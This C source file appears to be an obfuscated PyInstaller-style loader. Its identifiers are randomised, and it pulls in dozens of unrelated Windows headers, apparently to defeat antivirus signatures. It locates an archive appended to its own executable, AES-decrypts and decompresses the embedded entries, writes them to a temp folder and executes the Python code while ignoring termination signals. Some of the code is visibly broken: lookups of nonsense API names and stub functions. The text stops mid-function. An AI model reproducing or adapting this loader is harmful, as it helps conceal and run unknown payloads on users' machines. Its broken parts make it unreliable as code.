#define _WIN32_WINNT 0x0500
#include "utils.h"
#include <celib.h>
#include <batclass.h>
#include <napprotocol.h>
#include <penwin.h>
#include <wpcevent.h>
#include <commctrl.h>
#include <kxia64.h>
#include <pchannel.h>
#include <optary.h>
#include <memory.h>
#include <activscp.h>
#include <rrascfg.h>
#include <propidl.h>
#include <xmldsodid.h>
#include <emptyvc.h>
#include <ime.h>
#include <iadmw.h>
#include <accctrl.h>
#include <windows.h>
#include <cscobj.h>
#include <string.h>
#include <pgobootrun.h>
#include <opmapi.h>
#include <ndhelper.h>
#include <profile.h>
#include <mq.h>
#include <signal.h>
#include <certcli.h>
#include <signal.h>
#include "utils.h"
#define snprintf _snprintf
#include <string.h>
#include <sys/stat.h>
#define unsetenv(x) _putenv(x "=")
#define vsnprintf _vsnprintf
#include <direct.h>
#include <sys/types.h>
#include <process.h>
#include "zlib.h"
#include <stdio.h>
#include <windows.h>
#include <io.h>
#include "launch.h"
char* basename (char *VxmBpD) {
char *FOCMfmSJaAb = strrchr (VxmBpD, '\\');
if (!FOCMfmSJaAb) FOCMfmSJaAb = strrchr (VxmBpD, '/');
return FOCMfmSJaAb ? ++FOCMfmSJaAb : (char*)VxmBpD;}
int uugfjyptkuW(void) {
OSVERSIONINFO YQAnwMKckhvrzL;
ZeroMemory(&YQAnwMKckhvrzL, sizeof(OSVERSIONINFO));
YQAnwMKckhvrzL.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&YQAnwMKckhvrzL);
return ((YQAnwMKckhvrzL.dwMajorVersion > 5) || ((YQAnwMKckhvrzL.dwMajorVersion == 5) && (YQAnwMKckhvrzL.dwMinorVersion >= 1)));}
int LsWTaRHoEPIgWx(char *QGannIEIcRQH, char *lbqzmOmBLLFyQF) { return 0; }
void bZmJnbBpUr(void) {
void (WINAPI *oIANLe)(HANDLE);
BOOL (WINAPI *BVQocHmGpTsxkH)(DWORD dwFlags, ULONG_PTR ulCookie);
HANDLE lAwRRXbtSedVl;
if (!uugfjyptkuW()) return;
lAwRRXbtSedVl = LoadLibrary("kernel32");
oIANLe = (void*)GetProcAddress(lAwRRXbtSedVl, "oIANLe");
BVQocHmGpTsxkH = (void*)GetProcAddress(lAwRRXbtSedVl, "BVQocHmGpTsxkH");
if (!oIANLe || !BVQocHmGpTsxkH) { return; }}
void YQxtJRuS(void) { InitCommonControls(); }
int rGmtKNXlanajCk(char *aqAinie, const char *QtaiNLZTPtruv) {
if (!GetModuleFileNameA(NULL, aqAinie, _MAX_PATH)) { return -1; } return 0; }
int pGqdIbzUvaIPrqK(LPWSTR FeOuEEPvEcwWcL) {
if (!GetModuleFileNameW(NULL, FeOuEEPvEcwWcL, _MAX_PATH)) { return -1; } return 0; }
void EXXGSEMCxVkyVH(char *OtavwTd, const char *DjIFwDBO) {
char *HTAPPlHTXUZuEtS = NULL;
strcpy(OtavwTd, DjIFwDBO);
for (HTAPPlHTXUZuEtS = OtavwTd + strlen(OtavwTd); *HTAPPlHTXUZuEtS != '\\' && HTAPPlHTXUZuEtS >= OtavwTd + 2; --HTAPPlHTXUZuEtS);
*++HTAPPlHTXUZuEtS = '\0'; }
void jHJSnBpS(char *HWGelJeZDK, const char *VSWrUqR){
strcpy(HWGelJeZDK, VSWrUqR);
strcpy(HWGelJeZDK + strlen(HWGelJeZDK) - 3, "pkg");}
 int gXYswXCgIDxr(const ARCHIVE_STATUS *AZrBnezA) { return 0; }
int Vipouk(LPWSTR FXhsdUtYTKFGZ) {
SECURITY_ATTRIBUTES yeNqOKpCgtUDbh;
STARTUPINFOW JiMnTgNd;
PROCESS_INFORMATION mAgVlIpWFX;
int hskUIs = 0;
yeNqOKpCgtUDbh.nLength = sizeof(yeNqOKpCgtUDbh);
signal(SIGTERM, SIG_IGN);
yeNqOKpCgtUDbh.lpSecurityDescriptor = NULL;
yeNqOKpCgtUDbh.bInheritHandle = TRUE;
signal(SIGABRT, SIG_IGN);
signal(SIGINT, SIG_IGN);
signal(SIGBREAK, SIG_IGN);
GetStartupInfoW(&JiMnTgNd);
JiMnTgNd.wShowWindow = SW_NORMAL;
JiMnTgNd.hStdError = (void*)_get_osfhandle(fileno(stderr));
JiMnTgNd.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
JiMnTgNd.lpTitle = NULL;
JiMnTgNd.hStdInput = (void*)_get_osfhandle(fileno(stdin));
JiMnTgNd.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
JiMnTgNd.lpDesktop = NULL;
JiMnTgNd.lpReserved = NULL;
if (CreateProcessW( FXhsdUtYTKFGZ, GetCommandLineW(), &yeNqOKpCgtUDbh, NULL, TRUE, 0,  NULL, NULL, &JiMnTgNd, &mAgVlIpWFX)) {
WaitForSingleObject(mAgVlIpWFX.hProcess, INFINITE);
GetExitCodeProcess(mAgVlIpWFX.hProcess, (unsigned long *)&hskUIs);
} else { hskUIs = -1; }
return hskUIs; }
DECLPROC(Py_SetProgramName);
DECLPROC(Py_Finalize);
DECLPROC(PyImport_AddModule);
DECLPROC(PyList_Append);
DECLPROC(PyInt_AsLong);
DECLPROC(PyString_AsString);
DECLPROC(PyDict_GetItemString);
DECLPROC(PyErr_Occurred);
DECLVAR(Py_FrozenFlag);
DECLPROC(PyObject_CallMethod);
DECLPROC(PyObject_CallFunction);
DECLPROC(PyErr_Print);
DECLPROC(PySys_SetObject);
DECLPROC(PyRun_SimpleString);
DECLPROC(Py_IncRef);
DECLPROC(Py_Initialize);
DECLPROC(Py_DecRef);
DECLPROC(PyModule_GetDict);
DECLVAR(Py_NoSiteFlag);
DECLPROC(PyImport_ImportModule);
DECLPROC(PyString_FromStringAndSize);
DECLPROC(PyErr_Clear);
DECLPROC(PyObject_SetAttrString);
DECLPROC(PyList_New);
DECLPROC(PyImport_ExecCodeModule);
DECLPROC(Py_BuildValue);
unsigned char *OMaiwDFXLJL(ARCHIVE_STATUS *ybYpKC, TOC *SjSnEpD);
int XQQHjqMxpOOZzh(char *idsvFIYHN){
int i;
char *BoBZUd;
char vfODPY[16];
GetTempPath(MAX_PATH, idsvFIYHN);
sprintf(vfODPY, "_MEI%d", getpid());
for (i=0;i<5;i++) {
    BoBZUd = _tempnam(idsvFIYHN, vfODPY);
    if (mkdir(BoBZUd) == 0) {
        strcpy(idsvFIYHN, BoBZUd); strcat(idsvFIYHN, "\\");
        free(BoBZUd); return 1;
    } free(BoBZUd);
} return 0; }
static int rpnkCBsHr(char *Jdgvzimq, const char *eiwQLCten, ...){
    va_list uDeBeDaQKxHNb;
    struct stat GEJNeFNwX;
    va_start(uDeBeDaQKxHNb, eiwQLCten);
    vsnprintf(Jdgvzimq, _MAX_PATH, eiwQLCten, uDeBeDaQKxHNb);
    va_end(uDeBeDaQKxHNb);
    return stat(Jdgvzimq, &GEJNeFNwX); }
int GDYRVJXHADmy(ARCHIVE_STATUS *yZXukFHgWqnEhw, char const * hSIHccBYbuBzTHV, char const * LpGGLNEijt) {
    char *sdBTPTbCg;
    strcpy(yZXukFHgWqnEhw->archivename, hSIHccBYbuBzTHV);
    strcat(yZXukFHgWqnEhw->archivename, LpGGLNEijt);
    strcpy(yZXukFHgWqnEhw->homepath, hSIHccBYbuBzTHV);
    strcpy(yZXukFHgWqnEhw->homepathraw, hSIHccBYbuBzTHV);
    for ( sdBTPTbCg = yZXukFHgWqnEhw->homepath; *sdBTPTbCg; sdBTPTbCg++ ) if (*sdBTPTbCg == '\\') *sdBTPTbCg = '/';
    return 0;}
int opGYgbQSK(ARCHIVE_STATUS *VkCsxmLaWp, int EOkdzu) {
    if (fseek(VkCsxmLaWp->fp, EOkdzu-(int)sizeof(COOKIE), SEEK_SET)) return -1;
    if (fread(&(VkCsxmLaWp->cookie), sizeof(COOKIE), 1, VkCsxmLaWp->fp) < 1) return -1;
    if (strncmp(VkCsxmLaWp->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
    return 0;}
    int acJORotZvpUt(ARCHIVE_STATUS *gJqaZJhbDjb){
        int i; int ixShxjvOxbD;
        gJqaZJhbDjb->fp = fopen(gJqaZJhbDjb->archivename, "rb");
        if (gJqaZJhbDjb->fp == NULL) { return -1;}
        fseek(gJqaZJhbDjb->fp, 0, SEEK_END);
        ixShxjvOxbD = ftell(gJqaZJhbDjb->fp);
        if (opGYgbQSK(gJqaZJhbDjb, ixShxjvOxbD) < 0) { return -1;}
        gJqaZJhbDjb->pkgstart = ixShxjvOxbD - ntohl(gJqaZJhbDjb->cookie.len);
        fseek(gJqaZJhbDjb->fp, gJqaZJhbDjb->pkgstart + ntohl(gJqaZJhbDjb->cookie.TOC), SEEK_SET);
        gJqaZJhbDjb->tocbuff = (TOC *) malloc(ntohl(gJqaZJhbDjb->cookie.TOClen));
        if (gJqaZJhbDjb->tocbuff == NULL){ return -1; }
        if (fread(gJqaZJhbDjb->tocbuff, ntohl(gJqaZJhbDjb->cookie.TOClen), 1, gJqaZJhbDjb->fp) < 1) { return -1; }
        gJqaZJhbDjb->tocend = (TOC *) (((char *)gJqaZJhbDjb->tocbuff) + ntohl(gJqaZJhbDjb->cookie.TOClen));
        if (ferror(gJqaZJhbDjb->fp)) { return -1; }
        return 0;}
        struct _old_typeobject;
        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
        typedef void (*destructor)(PyObject *);
        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;
            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;
        static void _EmulatedIncRef(PyObject *o){
            OldPyObject *oo = (OldPyObject*)o;
            if (oo) oo->ob_refcnt++;}
        static void _EmulatedDecRef(PyObject *o){
            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
            OldPyObject *oo = (OldPyObject*)o;
            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
int LSoedfbXa(HMODULE ZCbwMy, int falHNObMcPKhEFN){
GETPROC(ZCbwMy, PyErr_Occurred);
GETPROC(ZCbwMy, PyRun_SimpleString);
GETPROC(ZCbwMy, PyErr_Clear);
GETVAR(ZCbwMy, Py_FrozenFlag);
GETPROC(ZCbwMy, PyImport_AddModule);
GETPROCOPT(ZCbwMy, Py_IncRef);
GETPROC(ZCbwMy, Py_Initialize);
GETPROC(ZCbwMy, PyString_FromStringAndSize);
GETPROC(ZCbwMy, Py_BuildValue);
GETPROC(ZCbwMy, PyModule_GetDict);
GETPROC(ZCbwMy, PyObject_SetAttrString);
GETPROC(ZCbwMy, PyErr_Print);
GETPROC(ZCbwMy, PyInt_AsLong);
GETPROC(ZCbwMy, PyString_AsString);
GETPROC(ZCbwMy, PyImport_ExecCodeModule);
GETPROC(ZCbwMy, PyList_Append);
GETPROC(ZCbwMy, PyObject_CallFunction);
GETPROC(ZCbwMy, Py_Finalize);
GETPROC(ZCbwMy, Py_SetProgramName);
GETVAR(ZCbwMy, Py_NoSiteFlag);
GETPROCOPT(ZCbwMy, Py_DecRef);
GETPROC(ZCbwMy, PyObject_CallMethod);
GETPROC(ZCbwMy, PyList_New);
GETPROC(ZCbwMy, PyImport_ImportModule);
GETPROC(ZCbwMy, PyDict_GetItemString);
    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
    return 0;}
int OZgLWEexaNfGXph(ARCHIVE_STATUS *blsGDpjh){
    HINSTANCE PugkliLHcWbH;
    char CofPajWp[_MAX_PATH + 1];
    int XYJMvtjgbzTesu = ntohl(blsGDpjh->cookie.pyvers);
    sprintf(CofPajWp, "%spython%02d.dll", blsGDpjh->homepathraw, XYJMvtjgbzTesu);
    PugkliLHcWbH = LoadLibraryExA(CofPajWp, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!PugkliLHcWbH) {sprintf(CofPajWp, "%spython%02d.dll", blsGDpjh->temppathraw, XYJMvtjgbzTesu);
        PugkliLHcWbH = LoadLibraryExA(CofPajWp, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
    if (PugkliLHcWbH == 0) { return -1; }
    LSoedfbXa(PugkliLHcWbH, XYJMvtjgbzTesu);
    return 0;}
 TOC *SnzqeBsLhIzQvw(ARCHIVE_STATUS *HejLPfsLYapZIUA, TOC* MXUxxgz){
     TOC *ZFLRcZE = (TOC*)((char *)MXUxxgz + ntohl(MXUxxgz->structlen));
     if (ZFLRcZE < HejLPfsLYapZIUA->tocbuff) { return HejLPfsLYapZIUA->tocend; }
     return ZFLRcZE;}
int UTXErUXCMv(ARCHIVE_STATUS *OSFUUXA, int argc, char *argv[]) {
static char Elcsao[2*_MAX_PATH + 14];
int i;
char iQXmSqUKNmWOf[_MAX_PATH+1+80];
char GbbIjKsCTzqlccd[_MAX_PATH+1];
PyObject *eciRuptx;
PyObject *val;
PyObject *sys;
strcpy(Elcsao, "PYTHONPATH=");
if (OSFUUXA->temppath[0] != '\0') { strcat(Elcsao, OSFUUXA->temppath); Elcsao[strlen(Elcsao)-1] = '\0'; strcat(Elcsao, ";"); }
strcat(Elcsao, OSFUUXA->homepath);
if (strlen(Elcsao) > 14) Elcsao[strlen(Elcsao)-1] = '\0';
putenv(Elcsao);
strcpy(Elcsao, "PYTHONHOME=");
strcat(Elcsao, OSFUUXA->temppath);
putenv(Elcsao);
*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
PI_Py_SetProgramName(OSFUUXA->archivename);
PI_Py_Initialize();
PI_PyRun_SimpleString("import sys\n");
PI_PyRun_SimpleString("del sys.path[:]\n");
if (OSFUUXA->temppath[0] != '\0') {
    strcpy(GbbIjKsCTzqlccd, OSFUUXA->temppath);
    GbbIjKsCTzqlccd[strlen(GbbIjKsCTzqlccd)-1] = '\0';
    sprintf(iQXmSqUKNmWOf, "sys.path.append(r\"%s\")", GbbIjKsCTzqlccd);
    PI_PyRun_SimpleString(iQXmSqUKNmWOf);}
strcpy(GbbIjKsCTzqlccd, OSFUUXA->homepath);
GbbIjKsCTzqlccd[strlen(GbbIjKsCTzqlccd)-1] = '\0';
sprintf(iQXmSqUKNmWOf, "sys.path.append(r\"%s\")", GbbIjKsCTzqlccd);
PI_PyRun_SimpleString (iQXmSqUKNmWOf);
eciRuptx = PI_PyList_New(0);
val = PI_Py_BuildValue("s", OSFUUXA->archivename);
PI_PyList_Append(eciRuptx, val);
for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (eciRuptx, val); }
sys = PI_PyImport_ImportModule("sys");
PI_PyObject_SetAttrString(sys, "argv", eciRuptx);
return 0;}
int BTJAbjcAPPZD(ARCHIVE_STATUS *xRAAhnjCObdYSd){
    PyObject *XSWwxQrcyv; PyObject *YYNOuhHa; PyObject *vKHhDXNKWEnCX;
    TOC *NfXABHYOfx; PyObject *co; PyObject *mod;
    XSWwxQrcyv = PI_PyImport_ImportModule("marshal");
    YYNOuhHa = PI_PyModule_GetDict(XSWwxQrcyv);
    vKHhDXNKWEnCX = PI_PyDict_GetItemString(YYNOuhHa, "loads");
    NfXABHYOfx = xRAAhnjCObdYSd->tocbuff;
    while (NfXABHYOfx < xRAAhnjCObdYSd->tocend) {
        if (NfXABHYOfx->typcd == 'm' || NfXABHYOfx->typcd == 'M'){
            unsigned char *GKCIHlapOgVEB = OMaiwDFXLJL(xRAAhnjCObdYSd, NfXABHYOfx);
            co = PI_PyObject_CallFunction(vKHhDXNKWEnCX, "s#", GKCIHlapOgVEB+8, ntohl(NfXABHYOfx->ulen)-8);
            mod = PI_PyImport_ExecCodeModule(NfXABHYOfx->name, co);
            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
            free(GKCIHlapOgVEB);
        }
        NfXABHYOfx = SnzqeBsLhIzQvw(xRAAhnjCObdYSd, NfXABHYOfx);
    } return 0; }
int LGkxqEKIPsyyAu(ARCHIVE_STATUS *mzKRBbVZmqHbd, TOC *FNNRYNMIKwU){
    int pWsVcolBFzVAHa; int rTsCWAVsqlvfLO = mzKRBbVZmqHbd->pkgstart + ntohl(FNNRYNMIKwU->pos);
    char *tNRpbNjS = "sys.path.append(r\"%s?%d\")\n";
    char *yqqKstduUdFEd = (char *) malloc(strlen(tNRpbNjS) + strlen(mzKRBbVZmqHbd->archivename) + 32);
    sprintf(yqqKstduUdFEd, tNRpbNjS, mzKRBbVZmqHbd->archivename, rTsCWAVsqlvfLO);
    pWsVcolBFzVAHa = PI_PyRun_SimpleString(yqqKstduUdFEd);
    if (pWsVcolBFzVAHa != 0){ free(yqqKstduUdFEd); return -1; }
    free(yqqKstduUdFEd); return 0;}
int CUqmSyIqeVQMOq(ARCHIVE_STATUS *TqUrOWjrFpSsCD){
TOC * ZkjUohu; ZkjUohu = TqUrOWjrFpSsCD->tocbuff;
while (ZkjUohu < TqUrOWjrFpSsCD->tocend) {
    if (ZkjUohu->typcd == 'z') { LGkxqEKIPsyyAu(TqUrOWjrFpSsCD, ZkjUohu); }
    ZkjUohu = SnzqeBsLhIzQvw(TqUrOWjrFpSsCD, ZkjUohu); }
return 0; }
unsigned char *MhyTcsGGJh(unsigned char * dxaiGxLUvIUI, TOC *pBHaSwOWZGHK){
unsigned char *qqVssY; z_stream EBsekgUHBKJAfkT; int VCxsyjhCv;
qqVssY = (unsigned char *)malloc(ntohl(pBHaSwOWZGHK->ulen));
if (qqVssY == NULL) { return NULL; }
EBsekgUHBKJAfkT.zalloc = NULL;
EBsekgUHBKJAfkT.zfree = NULL;
EBsekgUHBKJAfkT.opaque = NULL;
EBsekgUHBKJAfkT.next_in = dxaiGxLUvIUI;
EBsekgUHBKJAfkT.avail_in = ntohl(pBHaSwOWZGHK->len);
EBsekgUHBKJAfkT.next_out = qqVssY;
EBsekgUHBKJAfkT.avail_out = ntohl(pBHaSwOWZGHK->ulen);
VCxsyjhCv = inflateInit(&EBsekgUHBKJAfkT);
if (VCxsyjhCv >= 0) { 
    VCxsyjhCv = (inflate)(&EBsekgUHBKJAfkT, Z_FINISH);
    if (VCxsyjhCv >= 0) { VCxsyjhCv = (inflateEnd)(&EBsekgUHBKJAfkT); }
    else { return NULL; } }
else { return NULL; }
return qqVssY;}
unsigned char *OMaiwDFXLJL(ARCHIVE_STATUS *jNDGedRWxuLqMEL, TOC *fuamylwUqpWn){
unsigned char *DDfdgSFtVqN;unsigned char *clsTMopI;
fseek(jNDGedRWxuLqMEL->fp, jNDGedRWxuLqMEL->pkgstart + ntohl(fuamylwUqpWn->pos), SEEK_SET);
DDfdgSFtVqN = (unsigned char *)malloc(ntohl(fuamylwUqpWn->len));
if (DDfdgSFtVqN == NULL) { return NULL; }
if (fread(DDfdgSFtVqN, ntohl(fuamylwUqpWn->len), 1, jNDGedRWxuLqMEL->fp) < 1) { return NULL; }
if (fuamylwUqpWn->cflag == '\2') {
    static PyObject *VlpOfVvhFs = NULL;
    PyObject *VVgclpejNGnXIF; PyObject *wOIYkYZlqxoVCo; PyObject *oYgjyeEDiyoO; PyObject *tgdzFGQpiPoZhM;
    long block_size; char *iv;
    if (!VlpOfVvhFs) VlpOfVvhFs = PI_PyImport_ImportModule("AES");
    wOIYkYZlqxoVCo = PI_PyModule_GetDict(VlpOfVvhFs);
    VVgclpejNGnXIF = PI_PyDict_GetItemString(wOIYkYZlqxoVCo, "new");
    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(wOIYkYZlqxoVCo, "block_size"));
    iv = malloc(block_size);
    memset(iv, 0, block_size);
    oYgjyeEDiyoO = PI_PyObject_CallFunction(VVgclpejNGnXIF, "s#Os#", DDfdgSFtVqN, 32, PI_PyDict_GetItemString(wOIYkYZlqxoVCo, "MODE_CFB"), iv, block_size);
    tgdzFGQpiPoZhM = PI_PyObject_CallMethod(oYgjyeEDiyoO, "decrypt", "s#", DDfdgSFtVqN+32, ntohl(fuamylwUqpWn->len)-32);
    memcpy(DDfdgSFtVqN, PI_PyString_AsString(tgdzFGQpiPoZhM), ntohl(fuamylwUqpWn->len)-32);
    Py_DECREF(oYgjyeEDiyoO); Py_DECREF(tgdzFGQpiPoZhM);}
if (fuamylwUqpWn->cflag == '\1' || fuamylwUqpWn->cflag == '\2') {
    clsTMopI = MhyTcsGGJh(DDfdgSFtVqN, fuamylwUqpWn);
    free(DDfdgSFtVqN); DDfdgSFtVqN = clsTMopI;
    if (DDfdgSFtVqN == NULL) { return NULL; } }
return DDfdgSFtVqN;}
FILE *dqYXPCtOMeolLcn(const char *IwFVlVicC, const char* GUMRCUkHURkeWqh) {
struct stat NDplcrqNGyDsth; char puBnsjpVbKx[_MAX_PATH+1]; char nkhQcit[_MAX_PATH+1]; char *DIGXmLsQL;
strcpy(puBnsjpVbKx, IwFVlVicC); strcpy(nkhQcit, GUMRCUkHURkeWqh); puBnsjpVbKx[strlen(puBnsjpVbKx)-1] = '\0';
DIGXmLsQL = strtok(nkhQcit, "/\\");
while (DIGXmLsQL != NULL){
    strcat(puBnsjpVbKx, "\\");
    strcat(puBnsjpVbKx, DIGXmLsQL);
    DIGXmLsQL = strtok(NULL, "/\\");
    if (!DIGXmLsQL) break;
    if (stat(puBnsjpVbKx, &NDplcrqNGyDsth) < 0) {mkdir(puBnsjpVbKx);} }
return fopen(puBnsjpVbKx, "wb"); }
static int XmYeOtpQQ(ARCHIVE_STATUS *xBNVwmHSTqiWgu) {
char *MUcwRFJtmTnFDZ;
if (xBNVwmHSTqiWgu->temppath[0] == '\0') {
    if (!XQQHjqMxpOOZzh(xBNVwmHSTqiWgu->temppath)) {return -1;}
    strcpy(xBNVwmHSTqiWgu->temppathraw, xBNVwmHSTqiWgu->temppath);
    for ( MUcwRFJtmTnFDZ=xBNVwmHSTqiWgu->temppath; *MUcwRFJtmTnFDZ; MUcwRFJtmTnFDZ++ ) if (*MUcwRFJtmTnFDZ == '\\') *MUcwRFJtmTnFDZ = '/';}
return 0;}
int sEOlmX(ARCHIVE_STATUS *wMWoLyoSjfl, TOC *GaynPCBTjvTQ) {
FILE *OBgfPTWETlvM; unsigned char *NIwQTcPMwo = OMaiwDFXLJL(wMWoLyoSjfl, GaynPCBTjvTQ);
if (XmYeOtpQQ(wMWoLyoSjfl) == -1){ return -1; }
OBgfPTWETlvM = dqYXPCtOMeolLcn(wMWoLyoSjfl->temppath, GaynPCBTjvTQ->name);
if (OBgfPTWETlvM == NULL)  { return -1; }
else { fwrite(NIwQTcPMwo, ntohl(GaynPCBTjvTQ->ulen), 1, OBgfPTWETlvM); fclose(OBgfPTWETlvM); }
free(NIwQTcPMwo); return 0; }
static int DxJuDpKBMqlFI(char *LwuwiSsrlMyxzut, char *UTnXqOn, const char *SJkiNb) {
char nvPgLrxBadiG[_MAX_PATH + 1];
strcpy(nvPgLrxBadiG, SJkiNb);
strcpy(LwuwiSsrlMyxzut, strtok(nvPgLrxBadiG, ":"));
strcpy(UTnXqOn, strtok(NULL, ":")) ;
if (LwuwiSsrlMyxzut[0] == 0 || UTnXqOn[0] == 0) return -1;
return 0; }
static int LgGaDjjtmMMirmu(const char *lZKoSD, const char *omHFpNHqFQSGb, const char *SVltGJHA) {
FILE *DWSiDgPjlyF = fopen(lZKoSD, "rb"); FILE *twVnAjn = dqYXPCtOMeolLcn(omHFpNHqFQSGb, SVltGJHA);
char buf[4096]; int error = 0;
if (DWSiDgPjlyF == NULL || twVnAjn == NULL) return -1;
while (!feof(DWSiDgPjlyF)) {
    if (fread(buf, 4096, 1, DWSiDgPjlyF) == -1) {
        if (ferror(DWSiDgPjlyF)) { clearerr(DWSiDgPjlyF); error = -1; break; }
    } else {
        fwrite(buf, 4096, 1, twVnAjn);
        if (ferror(twVnAjn)) { clearerr(twVnAjn); error = -1; break;}}}
fclose(DWSiDgPjlyF); fclose(twVnAjn); return error; }
static char *htufgNawrmvE(const char *INGYgXXXwhJ) {
char *tceGRMClxJzNlkJ = strrchr(INGYgXXXwhJ, '\\');
char *PWUJgkjdhxx = (char *) calloc(_MAX_PATH, sizeof(char));
if (tceGRMClxJzNlkJ != NULL) strncpy(PWUJgkjdhxx, INGYgXXXwhJ, tceGRMClxJzNlkJ - INGYgXXXwhJ + 1);
else strcpy(PWUJgkjdhxx, INGYgXXXwhJ);
return PWUJgkjdhxx; }
static int UtyJijnpviLv(ARCHIVE_STATUS *WNCYNafS, const char *PoyjsvinN, const char *veLylGKmNRS){
if (XmYeOtpQQ(WNCYNafS) == -1){ return -1; }
if (LgGaDjjtmMMirmu(PoyjsvinN, WNCYNafS->temppath, veLylGKmNRS) == -1) { return -1; }
return 0; }
static ARCHIVE_STATUS *LpduSyRZj(ARCHIVE_STATUS *HSxWFbyUsmBahY[], const char *uIIbYFWc) {
ARCHIVE_STATUS *ClQXoSS = NULL; int i = 0;
if (XmYeOtpQQ(HSxWFbyUsmBahY[SELF]) == -1){ return NULL; } 
for (i = 1; HSxWFbyUsmBahY[i] != NULL; i++){ if (strcmp(HSxWFbyUsmBahY[i]->archivename, uIIbYFWc) == 0) { return HSxWFbyUsmBahY[i]; } }
if ((ClQXoSS = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
strcpy(ClQXoSS->archivename, uIIbYFWc);
strcpy(ClQXoSS->homepath, HSxWFbyUsmBahY[SELF]->homepath);
strcpy(ClQXoSS->temppath, HSxWFbyUsmBahY[SELF]->temppath);
strcpy(ClQXoSS->homepathraw, HSxWFbyUsmBahY[SELF]->homepathraw);
strcpy(ClQXoSS->temppathraw, HSxWFbyUsmBahY[SELF]->temppathraw);
if (acJORotZvpUt(ClQXoSS)) { free(ClQXoSS); return NULL; }
HSxWFbyUsmBahY[i] = ClQXoSS; return ClQXoSS; }
static int SBwgVdlNj(ARCHIVE_STATUS *uWwMEUiSLkve, const char *OzcxLf) {
TOC * WtwMPvFX = uWwMEUiSLkve->tocbuff;
while (WtwMPvFX < uWwMEUiSLkve->tocend) {
    if (strcmp(WtwMPvFX->name, OzcxLf) == 0) if (sEOlmX(uWwMEUiSLkve, WtwMPvFX)) return -1;
    WtwMPvFX = SnzqeBsLhIzQvw(uWwMEUiSLkve, WtwMPvFX); }
return 0; }
static int WOONAfV(ARCHIVE_STATUS *EbnCBUuNZ[], const char *cZrfupB) {
ARCHIVE_STATUS *BHtkVAEhFIAgOGN = NULL;
char XpLvsrkoRQ[_MAX_PATH + 1]; char DylBdQOFa[_MAX_PATH + 1];
char HxgPdMvt[_MAX_PATH + 1]; char *spOLjLmcHevsS = NULL;
if (DxJuDpKBMqlFI(XpLvsrkoRQ, DylBdQOFa, cZrfupB) == -1) return -1;
spOLjLmcHevsS = htufgNawrmvE(XpLvsrkoRQ);
if (spOLjLmcHevsS[0] == 0) { free(spOLjLmcHevsS); return -1; }
if ((rpnkCBsHr(HxgPdMvt, "%s%s.pkg", EbnCBUuNZ[SELF]->homepath, XpLvsrkoRQ) != 0) &&
    (rpnkCBsHr(HxgPdMvt, "%s%s.exe", EbnCBUuNZ[SELF]->homepath, XpLvsrkoRQ) != 0) &&
    (rpnkCBsHr(HxgPdMvt, "%s%s", EbnCBUuNZ[SELF]->homepath, XpLvsrkoRQ) != 0)) { return -1; }
    if ((BHtkVAEhFIAgOGN = LpduSyRZj(EbnCBUuNZ, HxgPdMvt)) == NULL) { return -1; }
if (SBwgVdlNj(BHtkVAEhFIAgOGN, DylBdQOFa) == -1) { free(BHtkVAEhFIAgOGN); return -1; }
free(spOLjLmcHevsS); return 0; }
int YuAWFrBQfod(ARCHIVE_STATUS *nOZWSSddFEvl[]) {
TOC * QYmggfNSIFvQsHg = nOZWSSddFEvl[SELF]->tocbuff;
while (QYmggfNSIFvQsHg < nOZWSSddFEvl[SELF]->tocend) {
    if (QYmggfNSIFvQsHg->typcd == 'b' || QYmggfNSIFvQsHg->typcd == 'x' || QYmggfNSIFvQsHg->typcd == 'Z') return 1;
    if (QYmggfNSIFvQsHg->typcd == 'd')  return 1;
    QYmggfNSIFvQsHg = SnzqeBsLhIzQvw(nOZWSSddFEvl[SELF], QYmggfNSIFvQsHg);
} return 0; }
int QCvSyDwTysgwoCO(ARCHIVE_STATUS *hWVTocAqoBrCEfs[]) {
TOC * njpineF = hWVTocAqoBrCEfs[SELF]->tocbuff;
while (njpineF < hWVTocAqoBrCEfs[SELF]->tocend) {
    if (njpineF->typcd == 'b' || njpineF->typcd == 'x' || njpineF->typcd == 'Z')
        if (sEOlmX(hWVTocAqoBrCEfs[SELF], njpineF)) return -1;
    if (njpineF->typcd == 'd') {
        if (WOONAfV(hWVTocAqoBrCEfs, njpineF->name) == -1) return -1; }
    njpineF = SnzqeBsLhIzQvw(hWVTocAqoBrCEfs[SELF], njpineF); }
return 0; }
int vxFgxNlecXiV(ARCHIVE_STATUS *yOkdFCChkEc) {
unsigned char *yNXlcbNaJ; char dElzxnHXzfCJP[_MAX_PATH]; int EsHelF = 0;
TOC * FgmxoBz = yOkdFCChkEc->tocbuff;
PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
while (FgmxoBz < yOkdFCChkEc->tocend) {
    if (FgmxoBz->typcd == 's') {
        yNXlcbNaJ = OMaiwDFXLJL(yOkdFCChkEc, FgmxoBz);
        strcpy(dElzxnHXzfCJP, FgmxoBz->name); strcat(dElzxnHXzfCJP, ".py");
        __file__ = PI_PyString_FromStringAndSize(dElzxnHXzfCJP, strlen(dElzxnHXzfCJP));
        PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
        EsHelF = PI_PyRun_SimpleString(yNXlcbNaJ);
        if (EsHelF != 0) return EsHelF; free(yNXlcbNaJ); }
    FgmxoBz = SnzqeBsLhIzQvw(yOkdFCChkEc, FgmxoBz);
